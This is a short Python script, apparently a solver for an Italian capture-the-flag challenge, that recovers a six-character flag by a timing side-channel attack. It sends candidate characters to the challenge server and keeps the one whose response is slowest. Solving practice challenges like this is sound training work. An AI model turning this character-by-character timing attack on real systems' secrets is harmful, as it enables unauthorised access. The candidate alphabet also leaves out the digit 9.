import requests
import string
import time

site = "http://time-is-key.challs.olicyber.it/index.php"
flag = ""
alphabet = string.ascii_lowercase + "012345678"
flag_len = 6

for i in range(flag_len):
    for c in alphabet:
        attempt = flag + c
        data = {"flag": attempt.ljust(flag_len, "a")} 
        start = time.time()
        r = requests.post(site, data=data)
        elapsed = time.time() - start
        print(f"carattere: {attempt}, tempo: {elapsed:.2f}s")

        if elapsed >= (i + 1):
            print(f"trovato carattere: {c}")
            flag += c
            break

print(f"flag : {flag}")
